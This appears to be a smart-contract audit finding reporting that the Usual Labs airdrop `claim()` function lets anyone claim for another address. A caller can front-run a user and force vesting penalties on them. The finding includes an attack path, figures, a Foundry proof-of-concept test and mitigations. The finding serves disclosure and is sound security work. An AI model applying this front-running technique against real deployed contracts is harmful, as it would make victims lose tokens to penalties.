# The `claim()` function allows anyone to claim on behalf of another address, forcing them to incur penalties they could have avoided

### Summary

The [intended option for Tax Paid Early Claim (Top 80% - Tax paid)](https://usual.gitbook.io/usual-technical-documentation/Aw3jUdIChYIRnEPcqUqK/smart-contracts/protocol-contracts/airdrop-module#:~:text=Tax%20Paid%20Early%20Claim%20(Top%2080%25%20%2D%20Tax%20paid)%3A%20These%20users%2C%20while%20originally%20part%20of%20a%20vesting%20schedule%2C%20can%20pay%20a%20tax%20to%20skip%20the%20vesting.%20Once%20the%20tax%20is%20paid%2C%20they%20can%20claim%20the%20total%20amount%20directly%20without%20waiting%20for%20monthly%20releases.) users is to allow these users to pay tax in other to skip the vesting. Once the tax is paid, they can claim the total amount directly without waiting for monthly releases but the [claim function](https://github.com/sherlock-audit/2024-10-usual-labs-v1/blob/main/pegasus/packages/solidity/src/airdrop/AirdropDistribution.sol#L314) can be front-run thereby allowing the intended claimer to incures penalty they they would have avoided

### Attack Path

The Optimal Path for Alice:
- Pay tax early (before any claims)
- Claim full amount immediately (bypass vesting)
- Receive 100% of tokens with no penalties


Bob's Attack Makes This Impossible:
- Bob can front-run Alice's intended tax payment
- Forces her into the vesting schedule
- Each claim without tax payment incurs penalties
- Once a claim is made, Alice can't use the tax-paid instant vesting feature for the remaining lost tokens


The intended claim after each month
Alice amount = 4_866_160_317_000_000_000_000_000_000
Months = 6
total claimable by Alice at `12th Jan 2025 12:00:00 GMT+0000` without fees = Alice amount / Months `(811_026_719_500_000_000_000_000_000)`
total claimable by Alice at `12th Jan 2025 12:00:00 GMT+0000` without 50% fees due to penalty = Alice amount / Months `(405_513_359_750_000_000_000_000_000)`

Bob claims for Alice, and Alice incures 50% fees.

ALICE PAID TAX AND CLAIMS THE REMAINING AMOUNT
Alice claim = Alice amount - ([Alice Already claimed amount + penalty](https://github.com/sherlock-audit/2024-10-usual-labs-v1/blob/main/pegasus/packages/solidity/src/airdrop/AirdropDistribution.sol#L338)) = `4_460_646_957_250_000_000_000_000_000`

### Impact

Forcing unintended users to pay penalties, and after paying tax the the user already incure the penalty.


### PoC

```solidity
function testBobFrontrunningAttack() external {
        vm.warp(FIRST_AIRDROP_VESTING_CLAIMING_DATE);
        bytes32[] memory aliceProof = _aliceProof();

        uint256 penalty = 5000; // 50%
        uint256[] memory penalties = new uint256[](1);
        penalties[0] = penalty;
        address[] memory accounts = new address[](1);
        accounts[0] = alice;

        vm.startPrank(airdropPenaltyOperator);
        airdropDistribution.setPenaltyPercentages(penalties, accounts, 1);
        airdropDistribution.setPenaltyPercentages(penalties, accounts, 2);
        vm.stopPrank();

        // Bob claims on Alice's behalf before she pays tax
        vm.prank(bob);
        airdropDistribution.claim(alice, true, aliceAmount, aliceProof);
        // Alice balance after claiming
        uint256 aliceBalanceAfter = usualToken.balanceOf(alice);
        assertLt(aliceBalanceAfter, aliceAmount);

        vm.startPrank(airdropOperator);
        address[] memory addressesToAllocateTo = new address[](1);
        addressesToAllocateTo[0] = alice;
        uint256[] memory prelaunchBalances = new uint256[](1);
        prelaunchBalances[0] = aliceAmount;
        airdropTaxCollector.setUsd0ppPrelaunchBalances(addressesToAllocateTo, prelaunchBalances);
        vm.stopPrank();
        
        //Even if Alice pays tax now...
        vm.startPrank(alice);
        uint256 taxToPay = airdropTaxCollector.calculateClaimTaxAmount(alice);
        deal(address(usd0PP), alice, taxToPay);
        usd0PP.approve(address(airdropTaxCollector), taxToPay);
        airdropTaxCollector.payTaxAmount();

        vm.warp(SECOND_AIRDROP_VESTING_CLAIMING_DATE);
        airdropDistribution.claim(alice, true, aliceAmount, aliceProof);
        vm.stopPrank();
        assertLt(usualToken.balanceOf(alice), aliceAmount);
    }
```

### Mitigation

- Implementing claim authorization to restrict claims to the account owner

or

- Allowing tax payment to retroactively reclaim penalized tokens
